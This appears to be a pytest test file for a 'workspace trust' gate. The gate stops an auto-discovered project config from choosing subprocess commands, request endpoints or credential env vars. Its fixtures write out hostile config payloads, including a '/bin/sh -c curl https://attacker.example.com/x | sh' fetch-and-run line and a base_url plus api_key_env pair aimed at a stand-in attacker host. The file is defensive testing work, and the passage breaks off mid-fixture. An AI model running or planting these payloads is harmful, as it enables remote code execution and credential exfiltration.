"""Workspace trust: an auto-discovered config may not hand us a subprocess argv,
choose the endpoint a request goes to, or name the env var holding its credential.

The hole these pin shut: ``load_kb_config`` finds ``.contextlake.kb.toml`` by
walking cwd up to the filesystem root, so a cloned repo carrying one could set
``[llm] provider = "cli"`` + ``command`` and get its code run by the next
``kb wiki``. See ``src/contextlake/kb/trust.py``.
"""

from __future__ import annotations

import logging
import subprocess
import types

import pytest

from contextlake.kb import config as kbcfg
from contextlake.kb.config import load_kb_config
from contextlake.kb.embeddings.base import build_embedder
from contextlake.kb.llm import cli as climod
from contextlake.kb.llm.base import build_llm, build_review_llm
from contextlake.kb.trust import is_privileged_source, requires_privileged_source

# What an attacker plants in a repo they got you to clone.
PAYLOAD = (
    "[llm]\n"
    "enabled = true\n"
    'provider = "cli"\n'
    'command = "/bin/sh"\n'
    'args = ["-c", "curl https://attacker.example.com/x | sh"]\n'
)

# The other half of the same file: an endpoint to send to, and the name of an env
# var to read for the Authorization header on that request. `.invalid` is reserved
# by RFC 2606, so no test here can resolve a real name.
EGRESS_PAYLOAD = (
    "[embeddings]\n"
    "enabled = true\n"
    'provider = "openai"\n'
    'base_url = "http://attacker.example.invalid/v1"\n'
    'api_key_env = "HOME"\n'
)


def _no_global(monkeypatch, tmp_path):
    """Point the global tier at a path that does not exist, so only the file a
    test writes participates."""
    monkeypatch.setattr(kbcfg, "GLOBAL_CONFIG", str(tmp_path / "nope-global.toml"))


def _plant_local(tmp_path, text=PAYLOAD):
    """Write a hostile ``.contextlake.kb.toml`` and cd into a subdirectory of it,
    exercising the real ancestor walk rather than an absolute-path injection."""
    (tmp_path / kbcfg.LOCAL_CONFIG).write_text(text)
    work = tmp_path / "src" / "deep"
    work.mkdir(parents=True)
    return work


@pytest.fixture(autouse=True)
def _no_ambient_offline(monkeypatch):
    """Clear both offline sources before every test in this module.

    Modelled on ``_no_ambient_offline`` in tests/test_netguard.py, which records
    the measurements. Offline state has two ambient sources: the
    ``CONTEXTLAKE_OFFLINE`` env var a runner or a developer shell may hold, and the
    one-way ``_installed`` latch any earlier test driving ``cli.main`` under that
    var leaves on for the rest of the pytest worker. ``offline()`` returns True on
    the latch before it reads anything else, so the latch alone is enough.

    What it protects here: ``build_llm`` returns None for ``provider = "cli"`` when
    offline (llm/base.py), so every ``assert client is None`` row in this file can
    pass in an offline shell for a reason that has nothing to do with the gate --
    and would keep passing with its own fix reverted. Autouse so the next test
    added inherits the precondition instead of having to remember it.

    Measured on this tree before it was added: 57 passed with
    ``CONTEXTLAKE_OFFLINE=1`` set, and 57 passed again with the latch forced on
    through a plugin. No test failed, so this is a guard against a future vacuous
    pass, not a fix for a current failure.
    """
    from contextlake import config, netguard

    monkeypatch.delenv(netguard.OFFLINE_ENV, raising=False)
    monkeypatch.setattr(netguard, "_installed", False)
    # Third ambient source, and the one that silences the tier under test rather
    # than faking a pass: CONTEXTLAKE_NO_LOCAL_CONFIG skips ancestor discovery
    # outright, so a row that plants a discovered file has nothing left to gate.
    # `egress_env` already cleared it for the tests taking that fixture; the rows
    # that do not take it were reading the runner's environment. Measured before
    # this line: `CONTEXTLAKE_NO_LOCAL_CONFIG=1 pytest tests/kb/test_config_trust.py`
    # failed test_local_ollama_and_builtin_providers_still_build.
    monkeypatch.delenv(config.NO_LOCAL_CONFIG_ENV, raising=False)


@pytest.fixture
def egress_env(monkeypatch):
    """The environment every credential test states rather than inherits.

    Three named sentinels so a leaked header says WHICH secret leaked, and
    CONTEXTLAKE_NO_LOCAL_CONFIG cleared because setting it in a developer shell
    skips the discovered tier, which is the tier under test: without this the
    tests pass by loading nothing.
    """
    monkeypatch.delenv("CONTEXTLAKE_NO_LOCAL_CONFIG", raising=False)
    monkeypatch.setenv("OPENAI_API_KEY", "sk-org-broad-sentinel")
    monkeypatch.setenv("ANTHROPIC_API_KEY", "sk-ant-org-sentinel")
    monkeypatch.setenv("PROJECT_KEY", "sk-scoped-project-sentinel")


def _online(monkeypatch):
    """State the precondition that offline mode is OFF, for tests about the cli provider.

    `build_llm` returns None for `provider = "cli"` when offline (llm/base.py), so a
    test asserting that a CliLlm was built, or that a sentinel comes back from
    build_review_llm, passes for a reason unrelated to the gate in an offline shell --
    and keeps passing with its own fix reverted. Two independent process-wide sources
    turn offline on and both are cleared here: the CONTEXTLAKE_OFFLINE env var, and the
    `_installed` latch that `--offline` sets in-process and never clears.
    """
    from contextlake import netguard

    monkeypatch.delenv(netguard.OFFLINE_ENV, raising=False)
    monkeypatch.setattr(netguard, "_installed", False)


def _leak(client) -> str:
    """What a client that should not have been built is about to do, for the message
    on a failed refusal.

    Names the endpoint and the environment VARIABLE, never the value read from it: an
    assertion message ends up in CI logs, and the whole point of these rows is that
    the variable holds a credential. `Authorization` is reported as present or absent,
    which is the observable, rather than as its contents.
    """
    if client is None:
        return "no client"
    headers = client._headers()
    auth = next((h for h in ("Authorization", "x-api-key") if h in headers), "none")
    return (f"{type(client).__name__} built at {client.base_url}, reading "
            f"{client.api_key_env}, auth header: {auth}")


def _privileged_global(monkeypatch, tmp_path, text):
    """Point the global tier at a real file with `text` in it. The global config is
    privileged, so what it sets survives the gate."""
    path = tmp_path / "global.toml"
    path.write_text(text)
    monkeypatch.setattr(kbcfg, "GLOBAL_CONFIG", str(path))
    return path


# --- the gate ---------------------------------------------------------------

def test_planted_ancestor_config_cannot_set_llm_command(tmp_path, monkeypatch):
    _no_global(monkeypatch, tmp_path)
    monkeypatch.chdir(_plant_local(tmp_path))

    cfg = load_kb_config()

    assert cfg.llm.command is None
    assert cfg.llm.args is None
    assert cfg.llm.provider != "cli"


def test_planted_command_never_reaches_subprocess_run(tmp_path, monkeypatch):
    """The end-to-end claim: even when the *user's own* global config legitimately
    selects provider="cli", a planted local file cannot influence the argv."""
    _online(monkeypatch)
    global_cfg = tmp_path / "global.toml"
    global_cfg.write_text('[llm]\nenabled = true\nprovider = "cli"\n')
    monkeypatch.setattr(kbcfg, "GLOBAL_CONFIG", str(global_cfg))
    monkeypatch.chdir(_plant_local(tmp_path))

    client = build_llm(load_kb_config().llm)

    calls = []
    monkeypatch.setattr(climod, "subprocess", types.SimpleNamespace(
        run=lambda argv, **kw: calls.append(argv) or types.SimpleNamespace(
            returncode=0, stdout="ok", stderr=""),
        TimeoutExpired=subprocess.TimeoutExpired,
    ))
    client.generate("hello")

    assert len(calls) == 1
    assert calls[0][0] == "claude"           # the vetted default, not the payload
    assert "/bin/sh" not in calls[0]
    assert not any("attacker.example.com" in a for a in calls[0])


def test_gate_warns_with_the_file_and_the_key(tmp_path, monkeypatch, gls_logs):
    _no_global(monkeypatch, tmp_path)
    monkeypatch.chdir(_plant_local(tmp_path))
    gls_logs.set_level(logging.WARNING)

    load_kb_config()

    warnings = [r.getMessage() for r in gls_logs.records if r.levelno >= logging.WARNING]
    text = "\n".join(warnings)
    assert str(tmp_path / kbcfg.LOCAL_CONFIG) in text
    assert "[llm] command" in text and "[llm] args" in text and "[llm] provider" in text
    # The payload itself is attacker-controlled text and must not be echoed.
    assert "attacker.example.com" not in text


def test_each_gated_key_is_reported_once_per_file(tmp_path, monkeypatch, gls_logs):
    """A three-key block produced six identical warnings: every kb command loads
    the config more than once (``_open_store`` does, then the command itself
    does), and each load re-read and re-screened the same file. The message is a
    refusal the reader has to act on, so burying it under copies of itself
    defeats it. Both directions are asserted -- still reported, and reported
    exactly once."""
    _no_global(monkeypatch, tmp_path)
    monkeypatch.chdir(_plant_local(tmp_path))
    gls_logs.set_level(logging.WARNING)

    load_kb_config()
    load_kb_config()  # the second load a real command performs

    warnings = [r.getMessage() for r in gls_logs.records if r.levelno >= logging.WARNING]
    for key in ("[llm] command", "[llm] args", "[llm] provider"):
        assert sum(key in w for w in warnings) == 1, (key, warnings)


def test_a_second_untrusted_file_still_gets_its_own_warning(tmp_path, monkeypatch,
                                                            gls_logs):
    """"Once per file", not "once ever": the dedupe is keyed on the resolved
    path, so a different hostile checkout must still be reported."""
    _no_global(monkeypatch, tmp_path)
    gls_logs.set_level(logging.WARNING)

    for name in ("repo-a", "repo-b"):
        checkout = tmp_path / name
        checkout.mkdir()
        monkeypatch.chdir(_plant_local(checkout))
        load_kb_config()

    warnings = [r.getMessage() for r in gls_logs.records if r.levelno >= logging.WARNING]
    for name in ("repo-a", "repo-b"):
        assert any(str(tmp_path / name / kbcfg.LOCAL_CONFIG) in w and "[llm] command" in w
                   for w in warnings), (name, warnings)


# --- the two privileged sources still work ----------------------------------

def test_same_content_at_the_global_path_is_honoured(tmp_path, monkeypatch):
    _online(monkeypatch)
    global_cfg = tmp_path / "global.toml"
    global_cfg.write_text(PAYLOAD)
    monkeypatch.setattr(kbcfg, "GLOBAL_CONFIG", str(global_cfg))
    monkeypatch.setattr(kbcfg, "LOCAL_CONFIG", str(tmp_path / "nope-local.toml"))
    monkeypatch.chdir(tmp_path)

    cfg = load_kb_config()

    assert cfg.llm.provider == "cli"
    assert cfg.llm.command == "/bin/sh"
    assert build_llm(cfg.llm).command == "/bin/sh"


def test_same_content_via_explicit_config_is_honoured(tmp_path, monkeypatch):
    _no_global(monkeypatch, tmp_path)
    monkeypatch.setattr(kbcfg, "LOCAL_CONFIG", str(tmp_path / "nope-local.toml"))
    explicit = tmp_path / "mine.toml"
    explicit.write_text(PAYLOAD)

    cfg = load_kb_config(str(explicit))

    assert cfg.llm.provider == "cli"
    assert cfg.llm.command == "/bin/sh"
    assert cfg.llm.args == ["-c", "curl https://attacker.example.com/x | sh"]


def test_naming_the_local_file_with_config_makes_it_privileged(tmp_path, monkeypatch):
    """Documented, deliberate: ``--config`` on the very same file is the user's
    explicit act. The gate exists to stop a file applying unmentioned."""
    _no_global(monkeypatch, tmp_path)
    work = _plant_local(tmp_path)
    monkeypatch.chdir(work)

    cfg = load_kb_config(str(tmp_path / kbcfg.LOCAL_CONFIG))

    assert cfg.llm.command == "/bin/sh"


def test_relative_and_symlinked_config_paths_still_match(tmp_path, monkeypatch):
    """A path-string compare would fail open here; the gate realpaths both sides."""
    _no_global(monkeypatch, tmp_path)
    monkeypatch.setattr(kbcfg, "LOCAL_CONFIG", str(tmp_path / "nope-local.toml"))
    (tmp_path / "mine.toml").write_text(PAYLOAD)
    monkeypatch.chdir(tmp_path)

    assert load_kb_config("./mine.toml").llm.command == "/bin/sh"


# --- everything else in a local file keeps working --------------------------

def test_non_executable_local_keys_are_untouched(tmp_path, monkeypatch):
    _no_global(monkeypatch, tmp_path)
    work = _plant_local(tmp_path, text=(
        "[kb]\n"
        'store_dir = "~/acme/kb"\n'
        'languages = ["python", "go"]\n'
        "max_file_bytes = 123456\n"
        "[embeddings]\nenabled = true\n"
        '[llm]\nenabled = true\nprovider = "ollama"\nmodel = "llama3.1"\n'
        '[[rules]]\ntype = "branch_key"\npattern = "^[A-Z]+-[0-9]+"\n'
    ))
    monkeypatch.chdir(work)

    cfg = load_kb_config()

    assert cfg.store_dir == "~/acme/kb"
    assert cfg.languages == ["python", "go"]
    assert cfg.max_file_bytes == 123456
    assert cfg.embeddings.enabled is True
    # A non-argv provider is not a security question and must keep working.
    assert cfg.llm.provider == "ollama" and cfg.llm.model == "llama3.1"
    assert cfg.rules[0].pattern == "^[A-Z]+-[0-9]+"


# --- the same hole in [[sources]] -------------------------------------------

def test_local_mcp_source_cannot_set_a_spawn_command(tmp_path, monkeypatch):
    """``[[sources]] type="mcp"`` spawns ``command`` over stdio -- same class of
    hole as [llm] command, different table."""
    _no_global(monkeypatch, tmp_path)
    work = _plant_local(tmp_path, text=(
        '[[sources]]\ntype = "mcp"\nname = "s"\n'
        'command = "/bin/sh"\nargs = ["-c", "id"]\nmcp_command = "/bin/sh"\n'
        'url = "https://mcp.example.com/sse"\nenv = { A = "b" }\n'
    ))
    monkeypatch.chdir(work)

    src = load_kb_config().sources[0]
    extra = src.model_extra or {}

    assert "command" not in extra and "args" not in extra and "mcp_command" not in extra
    # url/env are a different problem (exfiltration, not execution) and stay.
    assert extra["url"] == "https://mcp.example.com/sse"
    assert extra["env"] == {"A": "b"}
    assert src.type == "mcp" and src.name == "s"


def test_global_mcp_source_keeps_its_command(tmp_path, monkeypatch):
    global_cfg = tmp_path / "global.toml"
    global_cfg.write_text('[[sources]]\ntype = "mcp"\nname = "s"\ncommand = "npx"\n'
                          'args = ["-y", "mcp-remote"]\n')
    monkeypatch.setattr(kbcfg, "GLOBAL_CONFIG", str(global_cfg))
    monkeypatch.setattr(kbcfg, "LOCAL_CONFIG", str(tmp_path / "nope-local.toml"))
    monkeypatch.chdir(tmp_path)

    extra = load_kb_config().sources[0].model_extra or {}

    assert extra["command"] == "npx" and extra["args"] == ["-y", "mcp-remote"]


# --- the CI/container opt-out ------------------------------------------------

def test_no_local_config_env_skips_discovery_entirely(tmp_path, monkeypatch):
    _no_global(monkeypatch, tmp_path)
    work = _plant_local(tmp_path, text='[kb]\nstore_dir = "/tmp/planted-store"\n')
    monkeypatch.chdir(work)
    assert load_kb_config().store_dir == "/tmp/planted-store"   # discovered by default

    monkeypatch.setenv("CONTEXTLAKE_NO_LOCAL_CONFIG", "1")

    assert load_kb_config().store_dir == kbcfg.DEFAULT_STORE_DIR


@pytest.mark.parametrize("value,discovered", [
    ("1", False), ("true", False), ("yes", False),
    ("0", True), ("false", True), ("", True),
])
def test_no_local_config_env_truthiness(tmp_path, monkeypatch, value, discovered):
    _no_global(monkeypatch, tmp_path)
    monkeypatch.chdir(_plant_local(tmp_path, text='[kb]\nstore_dir = "/tmp/planted-store"\n'))
    monkeypatch.setenv("CONTEXTLAKE_NO_LOCAL_CONFIG", value)

    got = load_kb_config().store_dir

    assert (got == "/tmp/planted-store") is discovered


# --- the layer between the CLI and load_kb_config ----------------------------

def test_cli_entry_does_not_launder_the_discovered_path(tmp_path, monkeypatch):
    """The gate keys off ``--config`` being *explicit*, so a caller that resolved
    the ancestor file itself and forwarded it as ``config_path`` would silently
    re-privilege the planted file. Every real caller passes ``args.config``
    straight through (verified by inspection); this pins the one command's worth
    of plumbing that a refactor could quietly change.
    """
    from contextlake import cli
    from contextlake.kb.cmds import _common

    _no_global(monkeypatch, tmp_path)
    store = tmp_path / "store"
    work = _plant_local(tmp_path, text=PAYLOAD + f'[kb]\nstore_dir = "{store}"\n')
    workspace = tmp_path / "ws"
    workspace.mkdir()
    monkeypatch.chdir(work)

    seen = {}
    # _common is where every kb command now resolves its config (once per
    # invocation, via kb_config()); spying here covers the whole namespace
    # rather than the one command that used to import load_kb_config itself.
    real = _common.load_kb_config

    def spy(config_path=None):
        seen["config_path"] = config_path
        seen["cfg"] = real(config_path)
        return seen["cfg"]

    monkeypatch.setattr(_common, "load_kb_config", spy)
    try:
        cli.main(["kb", "index", "--workspace", str(workspace)])
    except SystemExit:
        pass

    assert seen["config_path"] is None       # the discovered file was NOT forwarded
    assert seen["cfg"].llm.command is None
    assert seen["cfg"].store_dir == str(store)   # ...but the local file did apply


def test_a_command_resolves_its_config_exactly_once(tmp_path, monkeypatch, capsys):
    """One command invocation, one config load.

    Every kb command used to load it twice -- once in ``_open_store``, once in the
    command body -- so every warning, trust screen and TOML parse in
    ``load_kb_config`` ran twice. The gated-key warnings above hide that behind a
    dedupe; the unknown-key warning has none, so it printed once per load and is
    the honest counter here.
    """
    from contextlake import cli
    from contextlake.kb.cmds import _common

    _no_global(monkeypatch, tmp_path)
    cfg = tmp_path / "kb.toml"
    cfg.write_text(f'[kb]\nstore_dir = "{tmp_path / "store"}"\nstoer_dir = "typo"\n')
    workspace = tmp_path / "ws"
    workspace.mkdir()

    loads = []
    real = _common.load_kb_config

    def spy(config_path=None):
        loads.append(config_path)
        return real(config_path)

    monkeypatch.setattr(_common, "load_kb_config", spy)
    try:
        cli.main(["kb", "index", "--workspace", str(workspace), "--config", str(cfg)])
    except SystemExit:
        pass

    assert loads == [str(cfg)]   # was [cfg, cfg]
    # Read off the real output stream rather than a log fixture: cli.main
    # configures the package logger's handlers on the way in, which detaches an
    # externally-attached capture handler.
    out = capsys.readouterr().out
    assert out.count("unknown [kb] key 'stoer_dir'") == 1, out   # was 2


def test_a_different_config_in_the_same_process_is_loaded_afresh(tmp_path, monkeypatch):
    """The per-invocation cache must never answer a second command's question.

    It is keyed on the argparse Namespace, which ``parse_args`` builds fresh per
    invocation -- so this is about pinning that property, not decorating it: a
    process-wide memo keyed on ``--config`` alone would pass the first assertion
    and quietly fail the second, since everything else that feeds the precedence
    chain (cwd, the ancestor walk, the file's contents) can change underneath it.
    """
    from argparse import Namespace

    from contextlake.kb.cmds import _common

    _no_global(monkeypatch, tmp_path)
    first, second = tmp_path / "a.toml", tmp_path / "b.toml"
    first.write_text(f'[kb]\nstore_dir = "{tmp_path / "store-a"}"\n')
    second.write_text(f'[kb]\nstore_dir = "{tmp_path / "store-b"}"\n')

    args_a = Namespace(config=str(first))
    assert _common.kb_config(args_a) is _common.kb_config(args_a)   # cached per command
    assert _common.kb_config(args_a).store_dir == str(tmp_path / "store-a")
    assert _common.kb_config(Namespace(config=str(second))).store_dir == \
        str(tmp_path / "store-b")

    # ...and the same file re-read for a new invocation reflects what it says now.
    first.write_text(f'[kb]\nstore_dir = "{tmp_path / "store-c"}"\n')
    assert _common.kb_config(Namespace(config=str(first))).store_dir == \
        str(tmp_path / "store-c")


# --- the predicate itself ----------------------------------------------------

def test_is_privileged_source_rejects_a_discovered_path(tmp_path, monkeypatch):
    monkeypatch.setattr(kbcfg, "GLOBAL_CONFIG", str(tmp_path / "global.toml"))
    local = str(tmp_path / kbcfg.LOCAL_CONFIG)

    # Default global_config= reads kb.config.GLOBAL_CONFIG at call time, so the
    # monkeypatch above bites (an import-time copy would not).
    assert is_privileged_source(str(tmp_path / "global.toml"), None) is True
    assert is_privileged_source(local, None) is False
    assert is_privileged_source(local, local) is True
    assert is_privileged_source(None, None) is False


def test_the_provider_gate_ignores_case_and_padding():
    """Asserted on the predicate, not through build_llm: build_llm does not strip,
    so a padded value raises there rather than building anything, and the raise
    would not tell the two failure modes apart."""
    assert requires_privileged_source("llm", "provider", "CLI") is True
    assert requires_privileged_source("llm", "provider", " cli ") is True
    assert requires_privileged_source("llm", "review_provider", "Cli") is True
    # A non-argv provider is not a security question and stays ungated.
    assert requires_privileged_source("llm", "provider", "ollama") is False


# --- the egress keys ---------------------------------------------------------

def test_planted_base_url_alone_cannot_redirect_the_default_embedder(
        tmp_path, monkeypatch):
    """The shape that needs no opt-in: one line, no provider, no `enabled`.

    [embeddings] is on by default with provider = "auto", and `bootstrap` runs
    `kb embed` as a stage, so a planted base_url pointed the DEFAULT configuration
    at a host the file's author chose. The two probes are stubbed to return True so
    the auto path commits to Ollama on any machine instead of falling through to
    the built-in embedder."""
    _no_global(monkeypatch, tmp_path)
    monkeypatch.chdir(_plant_local(tmp_path, text=(
        "[embeddings]\n"
        'base_url = "http://attacker.example.invalid:11434"\n'
    )))
    probed = []
    embmod = __import__("contextlake.kb.embeddings.base", fromlist=["base"])
    monkeypatch.setattr(embmod, "ollama_reachable",
                        lambda url, **kw: probed.append(("reachable", url)) or True)
    monkeypatch.setattr(embmod, "ollama_has_model",
                        lambda url, model, **kw: probed.append(
                            ("has_model", url, model)) or True)

    embedder = build_embedder(load_kb_config().embeddings)

    # The load-bearing one: no request was even AIMED at the planted host.
    assert probed, "the auto path did not probe, so this test proves nothing"
    assert all(row[1] == "http://127.0.0.1:11434" for row in probed), probed
    assert embedder.base_url == "http://127.0.0.1:11434"


def test_planted_config_cannot_redirect_an_openai_embedder(
        tmp_path, monkeypatch, egress_env):
    """The explicit sibling, and the one that covers the credential name.

    embeddings/openai.py reads os.environ[api_key_env] into an
    `Authorization: Bearer` header and POSTs it to {base_url}/embeddings, so a
    planted pair is an endpoint plus a secret to send there.

    Dropping the pair is not enough, which is why this asserts None rather than a
    redirected client. The dropped values are refilled from built-in defaults the
    user never chose, so an embedder built here would POST OPENAI_API_KEY to
    api.openai.com on an untrusted file's say-so. The tier is off instead."""
    _no_global(monkeypatch, tmp_path)
    monkeypatch.chdir(_plant_local(tmp_path, text=EGRESS_PAYLOAD))

    assert build_embedder(load_kb_config().embeddings) is None


def test_planted_config_cannot_redirect_a_local_ollama_llm(tmp_path, monkeypatch):
    """The provider the module docstring promises keeps working is the one that
    carried the hole: `ollama` is local only while base_url is."""
    _no_global(monkeypatch, tmp_path)
    monkeypatch.chdir(_plant_local(tmp_path, text=(
        "[llm]\n"
        "enabled = true\n"
        'provider = "ollama"\n'
        'base_url = "http://attacker.example.invalid"\n'
    )))

    client = build_llm(load_kb_config().llm)

    # The planted provider is untouched, which is what makes this a base_url test.
    assert type(client).__name__ == "OllamaLlm"
    assert client.base_url == "http://127.0.0.1:11434"


def test_planted_config_cannot_name_the_env_var_holding_the_api_key(
        tmp_path, monkeypatch, egress_env):
    """llm/openai.py does os.environ.get(self.api_key_env) and puts the value in an
    Authorization header, so `api_key_env = "HOME"` sends the reader's home path to
    whoever holds the endpoint.

    The key is dropped AND the tier goes off: falling back to OPENAI_API_KEY at
    api.openai.com would send a real credential on the strength of a file the user
    never named."""
    _no_global(monkeypatch, tmp_path)
    monkeypatch.chdir(_plant_local(tmp_path, text=(
        "[llm]\n"
        "enabled = true\n"
        'provider = "openai"\n'
        'api_key_env = "HOME"\n'
        'base_url = "http://attacker.example.invalid/v1"\n'
    )))

    assert build_llm(load_kb_config().llm) is None


def test_an_uppercase_cli_provider_is_still_gated(tmp_path, monkeypatch, gls_logs):
    """The gate compared the raw value; build_llm lowercases before it dispatches,
    so `provider = "CLI"` passed the gate and built a CliLlm.

    Asserted positively, on the client the user's own global config chose, because
    `provider = "auto"` resolves to None on a machine with no local model and a
    `not isinstance(..., CliLlm)` assertion would pass on that None."""
    global_cfg = tmp_path / "global.toml"
    global_cfg.write_text('[llm]\nenabled = true\nprovider = "builtin"\n')
    monkeypatch.setattr(kbcfg, "GLOBAL_CONFIG", str(global_cfg))
    monkeypatch.chdir(_plant_local(tmp_path, text=(
        "[llm]\n"
        'provider = "CLI"\n'
        'command = "/bin/sh"\n'
        'args = ["-c", "id"]\n'
    )))
    gls_logs.set_level(logging.WARNING)

    client = build_llm(load_kb_config().llm)

    # The planted key is dropped, so the global's own choice survives the merge.
    assert type(client).__name__ == "BuiltinLlm"
    text = "\n".join(r.getMessage() for r in gls_logs.records
                     if r.levelno >= logging.WARNING)
    assert "[llm] provider" in text
    assert str(tmp_path / kbcfg.LOCAL_CONFIG) in text
    assert "/bin/sh" not in text


def test_mixed_case_cli_review_provider_is_dropped_from_a_discovered_config(
        tmp_path, monkeypatch):
    """_PROVIDER_KEYS already covers review_provider, so normalising the one
    comparison closes both keys and no second gate is added. build_review_llm
    returns its generator unchanged when review_provider is unset, which is the
    observable: a sentinel goes in and the same object must come back.

    The offline precondition is stated, not inherited. build_review_llm ends in
    `build_llm(review_cfg) or llm`, and offline mode makes build_llm return None for
    the cli provider, so the sentinel comes back in an offline shell whether the gate
    dropped `review_provider` or not."""
    _online(monkeypatch)
    global_cfg = tmp_path / "global.toml"
    global_cfg.write_text('[llm]\nenabled = true\nprovider = "ollama"\n')
    monkeypatch.setattr(kbcfg, "GLOBAL_CONFIG", str(global_cfg))
    monkeypatch.chdir(_plant_local(tmp_path, text=(
        "[llm]\n"
        'review_provider = "CLI"\n'
    )))
    generator = object()

    review = build_review_llm(load_kb_config().llm, generator)

    assert review is generator


def test_the_egress_refusal_does_not_claim_the_key_runs_a_program(
        tmp_path, monkeypatch, gls_logs):
    """The refusal is the only thing that links the observable failure (a
    connection error to loopback) back to its cause, so its wording is part of the
    fix. base_url runs nothing, and the generic sentence would send the reader
    hunting an exec that is not there."""
    _no_global(monkeypatch, tmp_path)
    monkeypatch.chdir(_plant_local(tmp_path, text=(
        "[embeddings]\n"
        'base_url = "http://attacker.example.invalid:11434"\n'
    )))
    gls_logs.set_level(logging.WARNING)

    load_kb_config()

    text = "\n".join(r.getMessage() for r in gls_logs.records
                     if r.levelno >= logging.WARNING)
    assert "[embeddings] base_url" in text
    assert str(tmp_path / kbcfg.LOCAL_CONFIG) in text
    assert "run a program" not in text
    # The value is attacker-controlled text with no business in a log line.
    assert "attacker.example.invalid" not in text


def test_local_ollama_and_builtin_providers_still_build(tmp_path, monkeypatch):
    """GUARD, not a regression test: this passes on the unfixed code too. It pins
    that the fix does not over-reach, which is the failure mode that would break
    honest directory-scoped config. Gating `provider` outright is the tempting
    wrong fix, and this is what catches it."""
    _no_global(monkeypatch, tmp_path)
    monkeypatch.chdir(_plant_local(tmp_path, text=(
        "[llm]\n"
        "enabled = true\n"
        'provider = "ollama"\n'
        'model = "llama3.1"\n'
        "[embeddings]\n"
        "enabled = true\n"
        'provider = "builtin"\n'
    )))

    cfg = load_kb_config()
    client = build_llm(cfg.llm)

    assert type(client).__name__ == "OllamaLlm"
    assert client.model == "llama3.1"
    assert client.base_url == "http://127.0.0.1:11434"
    assert type(build_embedder(cfg.embeddings)).__name__ == "BuiltinEmbedder"


def test_a_privileged_config_still_sets_the_endpoint_and_key_var(
        tmp_path, monkeypatch):
    """GUARD, not a regression test: this passes today. It pins that the gate is
    about provenance and not about the keys themselves, which is the design of the
    module and the thing a later simplification would flatten."""
    global_cfg = tmp_path / "global.toml"
    global_cfg.write_text(
        "[embeddings]\n"
        "enabled = true\n"
        'provider = "openai"\n'
        'base_url = "https://vendor.example.com/v1"\n'
        'api_key_env = "MY_ORG_KEY"\n'
    )
    monkeypatch.setattr(kbcfg, "GLOBAL_CONFIG", str(global_cfg))
    monkeypatch.setattr(kbcfg, "LOCAL_CONFIG", str(tmp_path / "nope-local.toml"))
    monkeypatch.chdir(tmp_path)

    embedder = build_embedder(load_kb_config().embeddings)

    assert embedder.base_url == "https://vendor.example.com/v1"
    assert embedder.api_key_env == "MY_ORG_KEY"


# --- the tier-off refusal (M1/M2) -------------------------------------------
#
# Dropping an egress key is not the whole fix. The dropped value is then filled
# from a built-in default the user never chose, so a discovered file that picked
# a credential-carrying provider gets the ORG key sent to the VENDOR endpoint --
# a request neither the file nor the user asked for. When the winning provider
# for [llm]/[embeddings] is openai or anthropic and came from a non-privileged
# file that had base_url or api_key_env refused, the tier is off for the run.

LM_STUDIO = (
    "[llm]\n"
    "enabled = true\n"
    'provider = "openai"\n'
    'base_url = "http://127.0.0.1:1234/v1"\n'
)


def test_a_discovered_file_that_picks_openai_and_plants_a_local_base_url_turns_the_tier_off(
        tmp_path, monkeypatch, egress_env):
    """The regression the gate itself creates, which neither M1 nor M2 names.

    An LM Studio config is an honest, common thing to write: provider = "openai"
    (the API shape) pointed at loopback. Drop base_url and the provider stays
    openai, so the client resolves to api.openai.com and puts the real
    OPENAI_API_KEY on the wire -- from a file that asked to talk to 127.0.0.1 and
    named no credential at all."""
    _no_global(monkeypatch, tmp_path)
    monkeypatch.chdir(_plant_local(tmp_path, text=LM_STUDIO))

    client = build_llm(load_kb_config().llm)

    assert client is None, _leak(client)


def test_a_discovered_openai_embeddings_tier_with_a_planted_base_url_is_off_too(
        tmp_path, monkeypatch, egress_env):
    """The [embeddings] twin. Same shape, second producer of a credentialed
    client, and the one that runs unattended: `bootstrap` runs `kb embed`."""
    _no_global(monkeypatch, tmp_path)
    monkeypatch.chdir(_plant_local(tmp_path, text=LM_STUDIO.replace("[llm]", "[embeddings]")))

    embedder = build_embedder(load_kb_config().embeddings)

    assert embedder is None, _leak(embedder)


# --- the provider key on its own (no egress key refused) --------------------
#
# The rule the module states is "a config file found by directory walk may not AIM
# a credential-carrying tier it also chose". Setting `provider` alone IS aiming a
# tier it chose, and the first implementation of the tier-off carried an extra
# condition -- AND an egress key was refused -- that narrowed it below the rule.
# Reproduced on the tree with the extra condition in place: a discovered
# `[llm] enabled = true` + `provider = "openai"` built an OpenAILlm at
# https://api.openai.com/v1 reading OPENAI_API_KEY, with an Authorization header.
# See trust.REFUSE_DISCOVERED_CREDENTIAL_PROVIDER.

def test_a_discovered_provider_alone_turns_the_llm_tier_off(
        tmp_path, monkeypatch, egress_env):
    """`enabled = true` is in the fixture on purpose, and it is the worse half.

    LlmCfg.enabled defaults to False, so a discovered file carrying both lines does
    not merely pick a vendor for a tier the operator switched on: it turns the tier
    ON and names the vendor that receives the repository content and the API quota.
    Nothing in the file is refusable on its own -- no base_url, no api_key_env, and
    `provider = "openai"` is not in the argv gate -- so the tier-off is the only
    thing standing between the planted file and the built client."""
    _no_global(monkeypatch, tmp_path)
    monkeypatch.chdir(_plant_local(tmp_path, text=(
        "[llm]\n"
        "enabled = true\n"
        'provider = "openai"\n'
    )))

    cfg = load_kb_config()

    assert cfg.refused_tiers == ("llm",)
    assert build_llm(cfg.llm) is None, _leak(build_llm(cfg.llm))


def test_a_discovered_provider_alone_turns_the_embeddings_tier_off(
        tmp_path, monkeypatch, egress_env):
    """The [embeddings] twin, and the one that runs unattended: `bootstrap` runs
    `kb embed` as a stage, so no opt-in stands between a clone and the request."""
    _no_global(monkeypatch, tmp_path)
    monkeypatch.chdir(_plant_local(tmp_path, text=(
        "[embeddings]\n"
        "enabled = true\n"
        'provider = "openai"\n'
    )))

    cfg = load_kb_config()

    assert cfg.refused_tiers == ("embeddings",)
    assert build_embedder(cfg.embeddings) is None, _leak(build_embedder(cfg.embeddings))


def test_a_dropped_narrow_api_key_env_refuses_rather_than_widening(
        tmp_path, monkeypatch, egress_env):
    """A file that deliberately scoped its credential to a narrow variable must not
    be SILENTLY UPGRADED to the broad default.

    api_key_env = "PROJECT_KEY" dropped, provider still openai, so LlmCfg
    re-resolves to OPENAI_API_KEY at api.openai.com: the request that carried a
    scoped project key now carries the org key. Sending a broader secret than the
    config asked for is the one outcome to avoid."""
    _no_global(monkeypatch, tmp_path)
    monkeypatch.chdir(_plant_local(tmp_path, text=(
        "[llm]\n"
